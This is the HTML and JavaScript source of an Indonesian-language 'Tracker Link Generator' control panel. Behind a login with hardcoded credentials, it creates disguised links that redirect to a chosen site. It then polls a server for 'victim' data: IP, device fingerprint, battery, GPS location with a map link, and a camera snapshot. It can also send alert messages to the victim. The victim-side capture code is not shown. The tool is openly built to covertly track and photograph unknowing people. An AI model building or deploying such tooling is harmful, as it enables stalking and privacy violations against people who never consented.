<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>ğŸ¯ Tracker Link Generator (Live)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <style>
    /* ===== GENERAL ===== */
    body {
      background: #0b0c10;
      color: #e0e0e0;
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }

    h2 {
      color: #f5f5f5;
      text-align: center;
      margin-bottom: 20px;
      font-weight: 600;
    }

    input, button {
      padding: 12px 16px;
      border-radius: 12px;
      font-size: 16px;
      border: none;
      margin-bottom: 12px;
      width: 100%;
      box-sizing: border-box;
      transition: all 0.2s ease;
    }

    input {
      background: #1f2833;
      color: #e0e0e0;
      border: 1px solid #45a29e;
    }

    input:focus {
      outline: none;
      border-color: #66fcf1;
      box-shadow: 0 0 8px #66fcf1;
    }

    button {
      background: linear-gradient(90deg, #45a29e, #66fcf1);
      color: #0b0c10;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid #45a29e;
    }

    button:hover {
      background: linear-gradient(90deg, #66fcf1, #45a29e);
      color: #0b0c10;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }

    .container {
      width: 100%;
      max-width: 520px;
      background: #1c1c1c;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(0,0,0,0.6);
    }

    .link-result {
      font-size: 14px;
      margin: 15px 0;
      word-break: break-word;
      padding: 10px;
      background: #16202c;
      border-radius: 12px;
      border: 1px solid #45a29e;
    }

    .link-result a {
      color: #66fcf1;
      text-decoration: none;
      font-weight: 500;
    }

    .victim-box {
      margin-top: 20px;
      background: #16202c;
      border-radius: 16px;
      padding: 18px;
      font-size: 14px;
      border: 1px solid #45a29e;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
      white-space: pre-wrap;
    }

    .victim-box h3 {
      margin-bottom: 12px;
      font-size: 18px;
      color: #66fcf1;
      font-weight: 600;
    }

    img.snapshot {
      max-width: 100%;
      border-radius: 12px;
      margin-top: 12px;
      border: 1px solid #45a29e;
    }

    #loginBox p {
      margin-top: -8px;
      font-size: 14px;
    }

  </style>
</head>
<body>
  <div class="container">

    <!-- LOGIN -->
    <div id="loginBox">
      <h2>ğŸ” Login</h2>
      <input type="text" id="username" placeholder="Username" />
      <input type="password" id="password" placeholder="Password" />
      <button onclick="login()">Login</button>
      <p id="loginMsg" style="color:#ff6b6b;"></p>
    </div>

    <!-- KONTEN UTAMA (disembunyikan sebelum login) -->
    <div id="mainContent" style="display:none;">
      <h2>ğŸ¯ Tracker Link Generator</h2>

      <form onsubmit="generateLink(event)">
        <input type="url" id="target" placeholder="https://example.com" required />
        <button type="submit">Generate Link</button>
      </form>

      <form onsubmit="sendCustomAlert(event)">
        <input type="text" id="customMsg" placeholder="ğŸ“¢ Pesan alert ke korban..." />
        <button type="submit">Kirim Alert</button>
      </form>

      <div class="link-result" id="generatedLink"></div>

      <div id="resultBox" class="victim-box" style="display: none;">
        <h3>âœ… Victim Information</h3>
        <div id="resultOutput">Menunggu korban...</div>
        <div id="mapBox" style="margin-top:10px;"></div>
        <div id="imgBox" style="margin-top:10px;"></div>
      </div>
    </div>
  </div>

  <script>
    // ===== LOGIN =====
    const validUsers = [
      { user: "admin", pass: "1234" },
      { user: "putra", pass: "putra123" }
    ];

    function login() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const msgBox = document.getElementById("loginMsg");

      const valid = validUsers.find(u => u.user === username && u.pass === password);
      if (valid) {
        msgBox.textContent = "âœ… Login berhasil!";
        document.getElementById("loginBox").style.display = "none";
        document.getElementById("mainContent").style.display = "block";
      } else {
        msgBox.textContent = "âŒ Username atau password salah!";
      }
    }

    // ===== TRACKER =====
    let currentCode = null;
    let fetched = false;

    function generateLink(e) {
      e.preventDefault();
      const input = document.getElementById("target").value.trim();
      if (!input) return;

      const code = Math.random().toString(36).substring(2, 10);
      currentCode = code;
      const link = `${window.location.origin}/track/${code}?id=${code}`;

      document.getElementById("generatedLink").innerHTML = `ğŸ”— <a href="${link}" target="_blank">${link}</a>`;
      document.getElementById("resultOutput").textContent = "Menunggu korban...";
      document.getElementById("resultBox").style.display = "block";

      fetch("/log-tracker-link", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: code,
          redirect_to: input,
          created_at: new Date().toISOString()
        })
      });

      pollVictimLogs();
    }

    function pollVictimLogs() {
      if (!currentCode || fetched) return;
      setInterval(async () => {
        const res = await fetch("/get-tracker-logs");
        const logs = await res.json();
        const victim = logs.find(v => v.tracker_id === currentCode);
        if (victim) {
          fetched = true;
          renderFullResult(victim);
        }
      }, 3000);
    }

    function renderFullResult(v) {
      const result = `
âš“ IP: ${v.ip} | Time: ${v.access_time}
â³ Date In Victim's Device : ${v.local_time}

ğŸ“± DEVICE OVERVIEW
ğŸ“² Device Name: ${v.user_agent}
ğŸ’» Operating System: ${parseOS(v.user_agent)}
ğŸŒ Browser: ${parseBrowser(v.user_agent)}
ğŸ”§ Platform: ${v.platform || 'N/A'}

ğŸ–¥ï¸ DISPLAY DETAILS
ğŸ“ Screen Size: ${v.screen}
ğŸªŸ Window Size: ${v.window}
ğŸ¨ Color Quality: 24-bit
ğŸ”„ Orientation: ${v.orientation || 'unknown'}
ğŸ“Š Pixel Density: ${v.dpr}x

âš¡ PERFORMANCE INFO
ğŸ§  CPU Cores: ${v.cpu}
ğŸ’¾ Device RAM: ${v.ram}
ğŸŒ Language: ${v.language}
ğŸ• Timezone: ${v.timezone}

ğŸ‘† INPUT CAPABILITIES
ğŸ“± Touch Screen: âœ… ${v.touch ? 'Yes' : 'No'}
ğŸ–ï¸ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
ğŸª Cookies: âœ… ${v.cookies ? 'Enabled' : 'Disabled'}
ğŸŒ Online Status: âœ… ${v.online ? 'Connected' : 'Disconnected'}

ğŸ”’ SECURITY FEATURES
ğŸš« Do Not Track: ${v.doNotTrack === '1' ? 'âœ… Enabled' : 'âŒ Disabled'}
ğŸ¤– Webdriver: ${v.webdriver ? 'âŒ Detected' : 'âœ… Not Detected'}
ğŸ“„ PDF Viewer: ${v.pdfViewerEnabled ? 'âœ… Available' : 'âŒ Not Available'}

ğŸ“· Media Device Information
Audio Input Devices: ${v.audioIn || 0}
Video Input Devices: ${v.videoIn || 0}
Audio Output Devices: ${v.audioOut || 0}

ğŸ“¶ NETWORK CONNECTION
ğŸš€ Connection Type: ${v.connection?.type || 'N/A'}
ğŸ”— Network Type: ${v.connection?.effectiveType || 'N/A'}
â¬‡ï¸ Download Speed: ${v.connection?.downlink || 'N/A'} Mbps
ğŸ’¾ Data Saver: ${v.connection?.saveData ? 'âœ… Enabled' : 'âŒ Disabled'}

ğŸ§  MEMORY USAGE
ğŸ“Š Memory Used: ${v.memoryUsed || 'N/A'}
ğŸ“ˆ Total Allocated: ${v.memoryAllocated || 'N/A'}
ğŸš§ Memory Limit: ${v.memoryLimit || 'N/A'}

ğŸ”‹ BATTERY STATUS
ğŸ”‹ Battery Level: ${v.battery?.level || 'N/A'}
âš¡ Charging Status: ${v.battery?.charging || 'N/A'}
      `;

      document.getElementById("resultOutput").textContent = result;

      if (v.location?.lat && v.location?.lon) {
        document.getElementById("mapBox").innerHTML = `
<h3>ğŸ“ Location</h3>
ğŸ“ Latitude: ${v.location.lat}<br>
ğŸ“ Longitude: ${v.location.lon}<br>
ğŸŒ <a href="https://maps.google.com/?q=${v.location.lat},${v.location.lon}" target="_blank">Google Maps</a>`;
      } else {
        document.getElementById("mapBox").innerHTML = `
<h3>ğŸ“ Location</h3>
ğŸš« Permission Denied or Unavailable`;
      }

      document.getElementById("imgBox").innerHTML = `
<h3>ğŸ“· Snapshot</h3>
<img class="snapshot" src="/static/shots/${v.tracker_id}.jpg?${Date.now()}" alt="snapshot korban">`;
    }

    function parseOS(ua) {
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone")) return "iOS";
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      return "Unknown";
    }

    function parseBrowser(ua) {
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Safari")) return "Safari";
      if (ua.includes("Edg")) return "Edge";
      return "Unknown";
    }

    function sendCustomAlert(e) {
      e.preventDefault();
      const msg = document.getElementById("customMsg").value.trim();
      if (!msg || !currentCode) return;

      fetch(`/send-alert/${currentCode}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: msg })
      }).then(() => alert("ğŸ“¢ Alert dikirim ke korban."));
    }
  </script>
</body>
</html>
